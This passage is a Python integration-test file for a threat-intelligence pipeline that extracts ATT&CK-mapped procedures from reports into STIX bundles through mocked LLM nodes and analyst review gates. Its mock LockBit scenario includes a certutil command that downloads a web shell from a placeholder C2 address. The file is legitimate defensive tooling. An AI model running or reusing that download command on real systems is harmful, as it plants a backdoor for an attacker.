"""Integration tests for the extraction pipeline.

These tests verify that nodes work together correctly, not just in isolation.
All LLM calls are mocked. No external services needed.

Test groups:
1. Graph compilation and structure validation
2. Full pipeline walkthrough (mocked LLM, auto-skip gates)
3. Gate-to-downstream integration
4. Rejection loop simulation (Gate 1 reject -> re-chunk -> re-run)
"""

from __future__ import annotations

import copy
from dataclasses import asdict
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.graph.state import (
    Channel,
    Chunk,
    Entity,
    EntityType,
    GateAction,
    Gate1RejectReason,
    PipelineStatus,
    ProcedureDraft,
    SourceType,
    TechniqueMapping,
)
from app.graph.pipeline import build_pipeline, compile_pipeline, route_after_gate_1, route_after_gate_2
from app.nodes.gates import gate_0, gate_1, gate_2, gate_chunks
from app.nodes.deterministic.parse import parse_and_validate
from app.nodes.deterministic.normalization import normalize
from app.nodes.deterministic.serialization import serialize_stix
from app.nodes.deterministic.bundle_validator import validate_bundle
from app.nodes.deterministic.distribution import distribute
from app.nodes.llm.entity_extraction import extract_entities
from app.nodes.llm.chunking import chunk_behaviors
from app.nodes.llm.figure_extraction import extract_figures
from app.nodes.llm.technique_extraction import extract_techniques
from app.nodes.llm.drafting import draft_procedures


# =============================================================================
# Helpers
# =============================================================================

def _merge_state(state: dict, update: dict) -> dict:
    """Simulate LangGraph's state merge: overwrite keys from update."""
    merged = copy.deepcopy(state)
    merged.update(update)
    return merged


def _make_llm_response(tool_input: dict):
    """Build a mock LLMResponse matching the adapter's return type."""
    from app.nodes.llm.llm_adapter import LLMResponse
    return LLMResponse(
        tool_output=tool_input,
        raw_text="",
        model="mock-model",
        input_tokens=100,
        output_tokens=50,
        stop_reason="end_turn",
    )


# =============================================================================
# Test 1: Graph compilation and structure
# =============================================================================

# ── shared LLM stub ──────────────────────────────────────────────────
#
# The payload builders live in tests/test_e2e.py and are exercised there on
# every run, so they track the current tool schemas. This module used to
# carry its OWN copies, which quietly drifted out of shape through the C+A+D
# refactor and are why these walkthroughs were skipped for months. One set of
# builders, one place to keep current.

from contextlib import contextmanager  # noqa: E402

from tests.test_e2e import (  # noqa: E402
    _mock_chunks,
    _mock_classify,
    _mock_drafts,
    _mock_entities,
    _mock_propose_techniques,
    _mock_techniques,
)


def _llm_dispatch(*args, **kwargs):
    """One stand-in for every call_llm, dispatching on the requested tool."""
    import re

    tool_choice = kwargs.get("tool_choice", {}) or {}
    tool = tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""

    if tool == "extract_entities":
        return _mock_entities()
    if tool == "classify_sections":
        return _mock_classify()
    if tool == "chunk_behaviors":
        return _mock_chunks()

    messages = kwargs.get("messages", args[1] if len(args) > 1 else [])
    prompt = "".join(m.get("content", "") for m in messages if isinstance(m, dict))
    ids = re.findall(r"chk-[a-f0-9]+", prompt)[:3] or ["chk-001", "chk-002", "chk-003"]

    if tool == "propose_techniques":
        return _mock_propose_techniques(ids)
    if tool == "extract_techniques":
        return _mock_techniques(ids)
    if tool == "draft_procedures":
        return _mock_drafts(ids)
    return _mock_classify()


@contextmanager
def _llm_patches():
    """Patch every call_llm site the walkthrough touches."""
    targets = [
        "app.nodes.llm.entity_extraction.call_llm",
        "app.nodes.llm.chunking.call_llm",
        "app.nodes.llm.technique_extraction.call_llm",
        "app.nodes.llm.drafting.call_llm",
    ]
    patches = [patch(t, new_callable=AsyncMock, side_effect=_llm_dispatch) for t in targets]
    for pt in patches:
        pt.start()
    try:
        yield
    finally:
        for pt in patches:
            pt.stop()


class TestGraphStructure:
    """Verify the LangGraph compiles correctly and has expected topology."""

    def test_build_pipeline_succeeds(self):
        """build_pipeline() returns a StateGraph without errors."""
        graph = build_pipeline()
        assert graph is not None

    def test_compile_pipeline_succeeds(self):
        """compile_pipeline() produces a compiled graph."""
        compiled = compile_pipeline()
        assert compiled is not None

    def test_compile_with_interrupt_before(self):
        """The default interrupt list pauses before EVERY registered gate.

        This used to say "all three gates" (there are four) and assert only
        that compile_pipeline returned something — so it would have passed
        with an empty interrupt list, which is precisely the bug it looks
        like it guards: a gate missing here runs inline and auto-approves
        with no analyst ever seeing it. That shipped once, when main.py
        pinned a list written before gate_chunks existed.

        Derived from the gate registry rather than hardcoded, so adding a
        gate cannot leave this behind.
        """
        from app.api.routes._gate_registry import GATES

        compiled = compile_pipeline()
        interrupts = set(getattr(compiled, "interrupt_before_nodes", ()) or ())
        assert interrupts, (
            "could not read interrupt_before_nodes off the compiled graph — "
            "the attribute moved, and this test would pass vacuously"
        )
        assert len(GATES) >= 4
        missing = sorted({g.node_name for g in GATES} - interrupts)
        assert not missing, (
            f"gate(s) {missing} are not in the default interrupt_before — they "
            f"would execute inline and auto-approve without review"
        )

    def test_all_expected_nodes_present(self):
        """Graph contains exactly the expected pipeline nodes."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()
        node_names = {n for n in graph.nodes.keys() if not n.startswith("__")}

        expected = {
            "parse_and_validate", "extract_figures", "classify_sections",
            "extract_entities",
            "gate_0", "chunk_behaviors", "gate_chunks", "extract_techniques",
            "draft_procedures", "gate_1", "normalize",
            "gate_2", "serialize_stix", "validate_bundle",
            "distribute", "synthesize_feedback",
        }
        assert node_names == expected

    def test_module_docstring_names_every_registered_node(self):
        """The module docstring of pipeline.py is the map a newcomer reads
        first, and it drifted for months: it described the chunk gate as a
        placeholder, named a dropped framework, and omitted four of the
        sixteen nodes. Every registered node must appear in it and it must
        name no node that does not exist."""
        import re
        import app.graph.pipeline as pipeline_module

        doc = pipeline_module.__doc__ or ""
        compiled = compile_pipeline()
        registered = {n for n in compiled.get_graph().nodes if not n.startswith("__")}
        named = {n for n in registered if re.search(rf"\b{re.escape(n)}\b", doc)}
        missing = sorted(registered - named)
        assert not missing, f"pipeline.py docstring does not mention node(s): {missing}"
        stale = sorted(
            n for n in re.findall(r"\b(gate_[a-z0-9_]+|[a-z]+_[a-z_]+)\b", doc)
            if n.startswith("gate_") and n not in registered
        )
        assert not stale, f"pipeline.py docstring names gate(s) that are not registered: {stale}"

    def test_entry_point_is_parse(self):
        """Graph starts at parse_and_validate."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()
        start_edges = [e for e in graph.edges if e.source == "__start__"]
        assert len(start_edges) == 1
        assert start_edges[0].target == "parse_and_validate"

    def test_end_point_is_synthesize_feedback(self):
        """Graph ends after synthesize_feedback in the success path. Three
        hard-fail paths also route to END: parse_and_validate (missing or
        unparseable file), chunk_behaviors (chunking hard-fail, skips
        gate_chunks — Batch H category B) and validate_bundle (bundle
        integrity failure, skips distribute). So four END edges."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()
        end_sources = {e.source for e in graph.edges if e.target == "__end__"}
        assert end_sources == {
            "synthesize_feedback", "validate_bundle", "chunk_behaviors",
            "parse_and_validate",
        }

    def test_sequential_edges(self):
        """Verify the non-conditional (sequential) edges."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()

        sequential = {
            (e.source, e.target)
            for e in graph.edges
            if not e.conditional and not e.source.startswith("__") and not e.target.startswith("__")
        }

        expected_sequential = {
            # parse_and_validate -> (extract_figures | END) is conditional
            # (failed parse ends the run), so it's not in the sequential set.
            ("extract_figures", "classify_sections"),
            ("classify_sections", "extract_entities"),
            ("extract_entities", "gate_0"),
            ("gate_0", "chunk_behaviors"),
            # chunk_behaviors -> (gate_chunks | END) is now conditional
            # (Batch H category B), so it's not in the sequential set.
            ("extract_techniques", "draft_procedures"),
            ("draft_procedures", "gate_1"),
            ("normalize", "gate_2"),
            ("serialize_stix", "validate_bundle"),
            # validate_bundle has conditional routing (distribute | END)
            ("distribute", "synthesize_feedback"),
        }
        assert sequential == expected_sequential

    def test_gate_1_conditional_edges(self):
        """Gate 1 has conditional edges to chunk_behaviors, extract_techniques, normalize."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()

        gate1_targets = {
            e.target for e in graph.edges
            if e.source == "gate_1" and e.conditional
        }
        assert gate1_targets == {"chunk_behaviors", "extract_techniques", "normalize"}

    def test_gate_2_conditional_edges(self):
        """Gate 2 has conditional edges to normalize and serialize_stix."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()

        gate2_targets = {
            e.target for e in graph.edges
            if e.source == "gate_2" and e.conditional
        }
        assert gate2_targets == {"normalize", "serialize_stix"}

    def test_route_after_gate_1_normalize(self):
        """route_after_gate_1 returns 'normalize' when no rejection routing."""
        state = {"gate1_rejection_routing": None}
        assert route_after_gate_1(state) == "normalize"

    def test_route_after_gate_1_chunk(self):
        """route_after_gate_1 returns 'chunk_behaviors' for chunk routing."""
        state = {"gate1_rejection_routing": "chunk_behaviors"}
        assert route_after_gate_1(state) == "chunk_behaviors"

    def test_route_after_gate_1_technique(self):
        """route_after_gate_1 returns 'extract_techniques' for technique routing."""
        state = {"gate1_rejection_routing": "extract_techniques"}
        assert route_after_gate_1(state) == "extract_techniques"

    def test_route_after_gate_2_approved(self):
        """route_after_gate_2 returns 'serialize_stix' when approved."""
        state = {"gate2_decision": {"approved": True}}
        assert route_after_gate_2(state) == "serialize_stix"

    def test_route_after_gate_2_rejected(self):
        """route_after_gate_2 returns 'normalize' when rejected."""
        state = {"gate2_decision": {"approved": False}}
        assert route_after_gate_2(state) == "normalize"

    def test_no_orphan_nodes(self):
        """Every non-special node has at least one incoming and one outgoing edge."""
        compiled = compile_pipeline()
        graph = compiled.get_graph()
        pipeline_nodes = {n for n in graph.nodes.keys() if not n.startswith("__")}

        sources = {e.source for e in graph.edges}
        targets = {e.target for e in graph.edges}

        for node in pipeline_nodes:
            assert node in sources or node == "distribute", f"{node} has no outgoing edge"
            assert node in targets or node == "parse_and_validate", f"{node} has no incoming edge"


# =============================================================================
# Test 2: Full pipeline walkthrough (mocked LLM, auto-skip gates)
# =============================================================================

class TestFullWalkthrough:
    """Walk state through every node in sequence with mocked LLM calls.

    This tests the state contract between nodes: each node must produce
    output that the next node can consume.
    """

    @pytest.fixture
    def initial_state(self, sample_text):
        """Minimal state to start the pipeline."""
        return {
            "source_id": "src-integration-001",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {
                "author": "DFIR Report",
                "publication_date": "2023-11-15",
                "threat_actor": "LockBit 3.0",
                "campaign": "ActiveMQ exploitation",
                "malware_family": "LockBit",
            },
            "source_reliability": 85,
            "gates_enabled": False,  # Auto-skip all gates
        }

    def _mock_entity_response(self):
        """Mock LLM response for entity extraction."""
        return _make_llm_response({
            "entities": [
                {
                    "value": "LockBit 3.0",
                    "entity_type": "intrusion_set",
                    "confidence": 0.95,
                    "context_snippet": "LockBit 3.0 ransomware actors exploited CVE-2023-46604",
                },
                {
                    "value": "Cobalt Strike",
                    "entity_type": "malware",
                    "confidence": 0.88,
                    "context_snippet": "download and execute a Cobalt Strike beacon",
                },
                {
                    "value": "certutil.exe",
                    "entity_type": "tool",
                    "confidence": 0.92,
                    "context_snippet": "used certutil.exe to download a web shell",
                },
                {
                    "value": "203.0.113.10",
                    "entity_type": "ioc_ip",
                    "confidence": 0.99,
                    "context_snippet": "C2 server at 203.0.113.10",
                },
                {
                    "value": "CVE-2023-46604",
                    "entity_type": "vulnerability",
                    "confidence": 1.0,
                    "context_snippet": "exploited CVE-2023-46604",
                },
            ],
            "detection_rules": [],
        })

    def _mock_classify_response(self):
        """Mock LLM response for section classification."""
        return _make_llm_response({
            "sections": [
                {
                    "text": (
                        "LockBit 3.0 ransomware actors exploited CVE-2023-46604, a remote code "
                        "execution vulnerability in Apache ActiveMQ, to gain initial access to "
                        "healthcare networks. Following exploitation, the actors used certutil.exe "
                        "to download a web shell from their C2 server at 203.0.113.10. The web "
                        "shell was placed in the ActiveMQ webapps directory. Subsequently, PowerShell "
                        "was used to download and execute a Cobalt Strike beacon, establishing "
                        "persistent command and control. The actors then used Mimikatz for credential "
                        "harvesting before deploying LockBit ransomware across the network."
                    ),
                    "classification": "behavioral_narrative",
                    "confidence": 0.95,
                },
            ],
        })

    def _mock_chunk_response(self):
        """Mock LLM response for behavioral chunking."""
        return _make_llm_response({
            "chunks": [
                {
                    "text": "LockBit 3.0 actors exploited CVE-2023-46604 in Apache ActiveMQ for initial access.",
                    "sequence_index": 1,
                    "predecessor_indices": [],
                    "branch_point": False,
                    "convergence_point": False,
                    "confidence": 0.90,
                },
                {
                    "text": "Used certutil.exe to download a web shell from C2 at 203.0.113.10.",
                    "sequence_index": 2,
                    "predecessor_indices": [1],
                    "branch_point": False,
                    "convergence_point": False,
                    "confidence": 0.85,
                },
                {
                    "text": "PowerShell downloaded and executed a Cobalt Strike beacon for C2.",
                    "sequence_index": 3,
                    "predecessor_indices": [2],
                    "branch_point": False,
                    "convergence_point": False,
                    "confidence": 0.80,
                },
            ],
        })

    def _mock_technique_response(self, chunks):
        """Mock LLM response for technique extraction.

        The tool schema expects chunk_techniques: [{chunk_id, techniques: [...]}]
        where each techniques entry has technique_id, technique_name, tactic, confidence.
        """
        chunk_ids = [c["chunk_id"] for c in chunks]
        technique_data = [
            ("T1190", "Exploit Public-Facing Application", "initial-access", 0.90),
            ("T1105", "Ingress Tool Transfer", "command-and-control", 0.85),
            ("T1059.001", "PowerShell", "execution", 0.82),
        ]
        chunk_techniques = []
        for i, cid in enumerate(chunk_ids):
            tid, tname, tactic, conf = technique_data[i]
            chunk_techniques.append({
                "chunk_id": cid,
                "techniques": [{
                    "technique_id": tid,
                    "technique_name": tname,
                    "tactic": tactic,
                    "confidence": conf,
                }],
            })
        return _make_llm_response({"chunk_techniques": chunk_techniques})

    def _mock_draft_response(self, chunks):
        """Mock LLM response for procedure drafting."""
        chunk_ids = [c["chunk_id"] for c in chunks]
        drafts = [
            {
                "chunk_id": chunk_ids[0],
                "name": "Exploit Apache ActiveMQ via CVE-2023-46604",
                "description": "The threat actor exploited CVE-2023-46604 RCE vulnerability in Apache ActiveMQ. The ClassInfo deserialization flaw allowed arbitrary command execution on the broker server. This provided initial access to the target healthcare network.",
                "platforms": ["linux::server", "windows::server"],
                "command_lines": [],
                "confidence": 90,
            },
            {
                "chunk_id": chunk_ids[1],
                "name": "Download web shell via certutil",
                "description": "The actor used certutil.exe to transfer a JSP web shell from the C2 server. The web shell was downloaded to the ActiveMQ webapps directory. This established a persistent web-based backdoor.",
                "platforms": ["windows::server"],
                "command_lines": ["certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
                "confidence": 85,
            },
            {
                "chunk_id": chunk_ids[2],
                "name": "Execute Cobalt Strike beacon via PowerShell",
                "description": "PowerShell was used to download and execute a Cobalt Strike beacon. The beacon established encrypted C2 communication. This provided persistent interactive access to the compromised host.",
                "platforms": ["windows::server"],
                "command_lines": [],
                "confidence": 75,
            },
        ]
        return _make_llm_response({"drafts": drafts})

    async def test_full_pipeline_auto_skip(self, initial_state):
        """Walk every node with all gates disabled.

        The single most important integration test: it proves state flows
        correctly from parse through distribute, node by node — the handoffs
        that test_graph_execution.py cannot see because LangGraph does the
        merging there.

        Skipped for a long time as "predates async-node conversion + C+A+D +
        gate_chunks + sequentiality + figure-extraction". Restored
        by awaiting the async nodes, inserting the gate_chunks step, and
        driving the LLM through the shared mock builders rather than this
        class's own stale ones — those builders are exercised by test_e2e on
        every run, so they cannot silently drift out of shape again.
        """
        state = dict(initial_state)

        # Stage 1: Parse (sync)
        result = parse_and_validate(state)
        state = _merge_state(state, result)
        assert state["status"] == PipelineStatus.PARSING.value
        assert len(state["parsed_text"]) > 100
        assert state.get("error") is None

        # Stage 1b: Figures — free text has none, so this exercises the skip
        # path. It still has to leave the state usable for what follows.
        result = await extract_figures(state)
        state = _merge_state(state, result)
        assert state["extracted_figures"] == []

        with _llm_patches():
            # Stage 2a: Entities
            result = await extract_entities(state)
            state = _merge_state(state, result)
            assert state["status"] == PipelineStatus.EXTRACTING_ENTITIES.value
            assert len(state["entities"]) == 5
            for e in state["entities"]:
                assert e["entity_id"], "Entity missing entity_id"

            # Gate 0: auto-skip
            result = gate_0(state)
            state = _merge_state(state, result)
            # A gate writes the transient RESUMING_FROM_* status, not its own,
            # so the Kanban card stays in the gate column while the pipeline
            # restarts. Deliberate — see the status gotcha in CLAUDE.md.
            assert state["status"] == PipelineStatus.RESUMING_FROM_GATE_0.value
            assert len(state["validated_entities"]) == 5
            for v in state["validated_entities"]:
                assert v["gate_action"] == GateAction.APPROVE.value

            # Stage 2b: Chunking
            result = await chunk_behaviors(state)
            state = _merge_state(state, result)
            assert state["status"] == PipelineStatus.CHUNKING.value
            assert len(state["chunks"]) == 3
            assert len(state["classified_sections"]) >= 1
            for c in state["chunks"]:
                assert c["chunk_id"], "Chunk missing chunk_id"

            # Gate chunks: auto-skip. This walkthrough predates the chunk gate.
            result = gate_chunks(state)
            state = _merge_state(state, result)
            assert len(state["chunks_approved_ids"]) == 3

            # Stage 3: Techniques (C+A+D — propose then pick, two LLM calls)
            result = await extract_techniques(state)
            state = _merge_state(state, result)
            assert state["status"] == PipelineStatus.EXTRACTING_TECHNIQUES.value
            assert len(state["technique_mappings"]) > 0

            # Stage 4: Drafting
            result = await draft_procedures(state)
            state = _merge_state(state, result)
            assert state["status"] == PipelineStatus.DRAFTING.value
            assert len(state["drafts"]) == 3
            for d in state["drafts"]:
                assert d["draft_id"], "Draft missing draft_id"
                assert d["name"], "Draft missing name"

        # Gate 1: auto-skip
        result = gate_1(state)
        state = _merge_state(state, result)
        assert state["status"] == PipelineStatus.RESUMING_FROM_GATE_1.value
        assert len(state["gate1_approved_draft_ids"]) == 3
        assert state["gate1_rejection_routing"] is None

        # Stage 5: Normalize
        result = normalize(state)
        state = _merge_state(state, result)
        assert state["status"] == PipelineStatus.NORMALIZING.value
        assert len(state["normalized_drafts"]) == 3
        for nd in state["normalized_drafts"]:
            assert "composite_confidence" in nd
            assert 0 <= nd["composite_confidence"] <= 100

        # Gate 2: auto-skip
        result = gate_2(state)
        state = _merge_state(state, result)
        assert state["status"] == PipelineStatus.RESUMING_FROM_GATE_2.value
        assert state["gate2_decision"]["approved"] is True

        # Stage 6a: Serialize
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            result = await serialize_stix(state)
        state = _merge_state(state, result)
        assert state["status"] == PipelineStatus.SERIALIZING.value
        bundle = state["stix_bundle"]
        assert bundle["type"] == "bundle"
        assert len(bundle["objects"]) > 0
        assert bundle["objects"][0].get("spec_version") == "2.1"
        obj_types = {obj["type"] for obj in bundle["objects"]}
        assert "identity" in obj_types
        assert "x-procedure" in obj_types
        assert state["validation_results"]["schema"] is True

        # Stage 6b: Validate the assembled bundle. Also new since this test
        # was written, and the node that decides whether distribute runs.
        result = validate_bundle(state)
        state = _merge_state(state, result)
        assert state.get("bundle_validation_failed") is not True, (
            f"bundle hard-failed: {state.get('error')}"
        )

        # Stage 6c: Distribute (dry run — Neo4j writes disabled)
        result = await distribute(state)
        state = _merge_state(state, result)
        assert state["status"] in (
            PipelineStatus.DISTRIBUTING.value,
            PipelineStatus.COMPLETED.value,
        )

    async def test_state_keys_stay_valid(self, initial_state):
        """Every node returns only keys declared on PipelineState.

        A node returning a key PipelineState does not declare is a silent
        dead end: LangGraph carries it, nothing downstream reads it, and the
        typo looks like "the feature just does not work". Cheap to check,
        and it covers every node in one pass.

        Restored and extended to the nodes added since it was
        written — extract_figures, gate_chunks and validate_bundle were not
        in the pipeline when this was first authored.
        """
        from app.graph.state import PipelineState

        valid_keys = set(PipelineState.__annotations__.keys())
        assert len(valid_keys) > 30, "PipelineState introspection looks wrong"

        state = dict(initial_state)
        checked: list[str] = []

        def _check(name, result):
            unknown = sorted(set(result) - valid_keys)
            assert not unknown, f"{name} returned key(s) not on PipelineState: {unknown}"
            checked.append(name)
            return _merge_state(state, result)

        state = _check("parse_and_validate", parse_and_validate(state))
        state = _check("extract_figures", await extract_figures(state))

        with _llm_patches():
            state = _check("extract_entities", await extract_entities(state))
            state = _check("gate_0", gate_0(state))
            state = _check("chunk_behaviors", await chunk_behaviors(state))
            state = _check("gate_chunks", gate_chunks(state))
            state = _check("extract_techniques", await extract_techniques(state))
            state = _check("draft_procedures", await draft_procedures(state))

        state = _check("gate_1", gate_1(state))
        state = _check("normalize", normalize(state))
        state = _check("gate_2", gate_2(state))

        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            state = _check("serialize_stix", await serialize_stix(state))

        state = _check("validate_bundle", validate_bundle(state))
        state = _check("distribute", await distribute(state))

        # Anti-vacuity: if the walk stops early, the assertions above are
        # trivially satisfied by the nodes that did run.
        assert len(checked) == 14, f"only walked {len(checked)} nodes: {checked}"


class TestGateToDownstream:
    """Verify gate output is consumable by the next downstream node."""

    @pytest.fixture
    def post_extraction_state(self, sample_text):
        """State after entity extraction, ready for Gate 0."""
        entities = [
            asdict(Entity(
                entity_id="ent-int-001",
                entity_type=EntityType.INTRUSION_SET.value,
                value="LockBit 3.0",
                confidence=0.92,
            )),
            asdict(Entity(
                entity_id="ent-int-002",
                entity_type=EntityType.MALWARE.value,
                value="Cobalt Strike",
                confidence=0.88,
            )),
            asdict(Entity(
                entity_id="ent-int-003",
                entity_type=EntityType.IOC_IP.value,
                value="203.0.113.10",
                confidence=0.85,
            )),
        ]
        return {
            "source_id": "src-int-001",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "parsed_text": sample_text,
            "metadata": {"author": "Test Author"},
            "source_reliability": 80,
            "gates_enabled": True,
            "entities": entities,
            "detection_rules": [],
        }

    @pytest.mark.asyncio
    async def test_gate0_output_feeds_chunking(self, post_extraction_state):
        """Gate 0 validated_entities is readable by chunk_behaviors."""
        # Analyst approves all, edits one
        reviews = [
            {"entity_id": "ent-int-001", "action": "approve"},
            {"entity_id": "ent-int-002", "action": "edit", "edited_value": "CobaltStrike"},
            {"entity_id": "ent-int-003", "action": "approve"},
        ]
        post_extraction_state["gate0_reviews"] = reviews

        result = gate_0(post_extraction_state)
        state = _merge_state(post_extraction_state, result)

        # validated_entities should be what chunk_behaviors reads
        assert len(state["validated_entities"]) == 3

        # The edited entity should have the new value
        edited = [v for v in state["validated_entities"] if v["entity_id"] == "ent-int-002"][0]
        assert edited["edited_value"] == "CobaltStrike"
        assert edited["gate_action"] == GateAction.EDIT.value

        # Chunking should be able to read these entities without error
        # (It uses them for entity context in the system prompt)
        with patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock) as mock_llm:
            classify_resp = _make_llm_response({
                "sections": [{
                    "text": state["parsed_text"],
                    "classification": "behavioral_narrative",
                    "confidence": 0.9,
                }],
            })
            chunk_resp = _make_llm_response({
                "chunks": [{
                    "text": "Exploited ActiveMQ for initial access.",
                    "sequence_index": 1,
                    "predecessor_indices": [],
                    "branch_point": False,
                    "convergence_point": False,
                    "confidence": 0.85,
                }],
            })
            mock_llm.side_effect = [classify_resp, chunk_resp]
            with patch(
                "app.nodes.llm.chunking._fetch_feedback_addendum",
                new_callable=AsyncMock,
                return_value="",
            ), patch(
                "app.nodes.llm.chunking._fetch_feedback_examples",
                new_callable=AsyncMock,
                return_value="",
            ):
                chunk_result = await chunk_behaviors(state)

        assert len(chunk_result["chunks"]) == 1
        assert chunk_result["status"] == PipelineStatus.CHUNKING.value

    async def test_gate0_removed_entities_excluded_from_serialize(self, post_extraction_state):
        """Entities removed at Gate 0 are excluded during STIX serialization.

        The gate-to-serializer handoff: a removal is only real if it survives
        all the way into the bundle. Skipped since serialize_stix became
        async; restored with the Neo4j enrichment stubbed so it
        stays hermetic.
        """
        reviews = [
            {"entity_id": "ent-int-001", "action": "approve"},
            {"entity_id": "ent-int-002", "action": "remove", "rationale": "False positive"},
            {"entity_id": "ent-int-003", "action": "approve"},
        ]
        post_extraction_state["gate0_reviews"] = reviews

        result = gate_0(post_extraction_state)
        state = _merge_state(post_extraction_state, result)

        # Build minimal serialize state
        state["normalized_drafts"] = [
            {
                "draft_id": "dft-int-001",
                "composite_confidence": 80,
                "confidence_breakdown": {
                    "source_reliability": 0.8,
                    "context_completeness": 0.7,
                    "behavioral_confidence": 0.85,
                },
                "standardized_names": {},
                "correlations": [],
                "enrichment": {},
            },
        ]
        state["drafts"] = [
            asdict(ProcedureDraft(
                draft_id="dft-int-001",
                chunk_id="chk-int-001",
                name="Exploit ActiveMQ",
                description="Exploited the vulnerability.",
                techniques=[TechniqueMapping(
                    technique_id="T1190",
                    technique_name="Exploit Public-Facing Application",
                    tactic="initial-access",
                    confidence=0.87,
                )],
                confidence=80,
                sequence_index=1,
                gate_action=GateAction.APPROVE.value,
            )),
        ]
        state["gate1_approved_draft_ids"] = ["dft-int-001"]

        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            result = await serialize_stix(state)

        # The removed Cobalt Strike entity should NOT appear in the bundle
        bundle = result["stix_bundle"]
        obj_names = [obj.get("name", "") for obj in bundle["objects"]]
        assert "Cobalt Strike" not in obj_names
        assert "CobaltStrike" not in obj_names

        # The approved entities should appear
        obj_values = []
        for obj in bundle["objects"]:
            if obj.get("name"):
                obj_values.append(obj["name"])
            if obj.get("value"):
                obj_values.append(obj["value"])
        assert "LockBit 3.0" in obj_values

    def test_gate1_output_feeds_normalize(self):
        """Gate 1 approved_draft_ids is what normalize uses to filter drafts."""
        drafts = [
            asdict(ProcedureDraft(
                draft_id="dft-g1-001", chunk_id="chk-001",
                name="Procedure A", description="A",
                techniques=[TechniqueMapping(
                    technique_id="T1190", technique_name="Exploit",
                    tactic="initial-access", confidence=0.9,
                )],
                confidence=85, sequence_index=1,
            )),
            asdict(ProcedureDraft(
                draft_id="dft-g1-002", chunk_id="chk-002",
                name="Procedure B", description="B",
                techniques=[TechniqueMapping(
                    technique_id="T1105", technique_name="Transfer",
                    tactic="command-and-control", confidence=0.8,
                )],
                confidence=75, sequence_index=2,
                predecessor_indices=[1],
            )),
        ]

        # Approve first, remove second
        reviews = [
            {"draft_id": "dft-g1-001", "action": "approve"},
            {"draft_id": "dft-g1-002", "action": "remove"},
        ]

        state = {
            "drafts": drafts,
            "gates_enabled": True,
            "gate1_reviews": reviews,
            "source_reliability": 80,
        }

        gate_result = gate_1(state)
        state = _merge_state(state, gate_result)

        assert state["gate1_approved_draft_ids"] == ["dft-g1-001"]

        # Now run normalize
        norm_result = normalize(state)

        # Only approved draft should be normalized
        assert len(norm_result["normalized_drafts"]) == 1
        assert norm_result["normalized_drafts"][0]["draft_id"] == "dft-g1-001"

    async def test_gate2_approved_feeds_serialize(self, sample_entities, sample_drafts):
        """Gate 2 approval feeds into serialize_stix correctly.

        Skipped since serialize_stix became async; restored with
        the Neo4j enrichment stubbed so it stays hermetic.
        """
        state = {
            "gates_enabled": True,
            "gate2_review": {"approved": True},
            "metadata": {"author": "Test Author"},
            "source_reliability": 85,
            "validated_entities": sample_entities,
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
            "normalized_drafts": [
                {
                    "draft_id": d["draft_id"],
                    "composite_confidence": 80,
                    "confidence_breakdown": {
                        "source_reliability": 0.85,
                        "context_completeness": 0.7,
                        "behavioral_confidence": 0.8,
                    },
                    "standardized_names": {},
                    "correlations": [],
                    "enrichment": {},
                }
                for d in sample_drafts
            ],
        }

        gate_result = gate_2(state)
        state = _merge_state(state, gate_result)

        assert state["gate2_decision"]["approved"] is True

        # Serialize should succeed
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            ser_result = await serialize_stix(state)
        assert ser_result["stix_bundle"]["type"] == "bundle"
        assert len(ser_result["stix_bundle"]["objects"]) > 0

    async def test_gate2_removal_reaches_the_bundle(
        self, sample_entities, sample_drafts,
    ):
        """A Gate 2 removal must be ABSENT from the serialized bundle.

        This is the test whose absence let audit finding C1 ship. The unit
        tests asserted on the dict gate_2 returns; nothing checked what that
        dict *did*. Two bugs hid in the gap: any removal routed back to
        `normalize` (discarding the decisions), and the serializer never read
        the removal list at all. So run the real path —
        normalize -> gate_2(remove) -> route -> serialize_stix — and diff the
        bundle against a control run with no removal, which keeps the
        assertion honest even if the fixture's edge mix changes.
        """
        def _base():
            return {
                "gates_enabled": True,
                "metadata": {"author": "Test Author"},
                "source_reliability": 85,
                "validated_entities": copy.deepcopy(sample_entities),
                "drafts": copy.deepcopy(sample_drafts),
                "gate1_approved_draft_ids": [
                    d["draft_id"] for d in sample_drafts
                ],
            }

        async def _serialize(state):
            with patch(
                "app.nodes.deterministic.serialization.run_query",
                new=AsyncMock(return_value=[]),
            ):
                return await serialize_stix(state)

        def _edges(bundle):
            by_id = {o["id"]: o for o in bundle["objects"]}

            def name(ref):
                obj = by_id.get(ref, {})
                return (obj.get("name") or obj.get("value") or "").lower()

            return [
                (name(o["source_ref"]), o["relationship_type"], name(o["target_ref"]))
                for o in bundle["objects"]
                if o.get("type") == "relationship"
            ]

        # --- control: approve everything ---
        control = _merge_state(_base(), normalize(_base()))
        control = _merge_state(control, gate_2({**control, "gate2_reviews": []}))
        control_edges = _edges((await _serialize(control))["stix_bundle"])

        # --- removal: take out one edge that actually reaches the bundle ---
        state = _merge_state(_base(), normalize(_base()))
        preview = state["relationship_preview"]
        control_set = set(control_edges)
        target = next(
            r for r in preview
            if (
                r["source_name"].lower(),
                r["relationship_type"],
                r["target_name"].lower(),
            ) in control_set
        )
        state = _merge_state(state, gate_2({
            **state,
            "gate2_reviews": [{"rel_id": target["id"], "action": "remove"}],
        }))

        # A removal refines the bundle; it must not loop back to normalize.
        assert route_after_gate_2(state) == "serialize_stix"

        after_edges = _edges((await _serialize(state))["stix_bundle"])

        removed_key = (
            target["source_name"].lower(),
            target["relationship_type"],
            target["target_name"].lower(),
        )
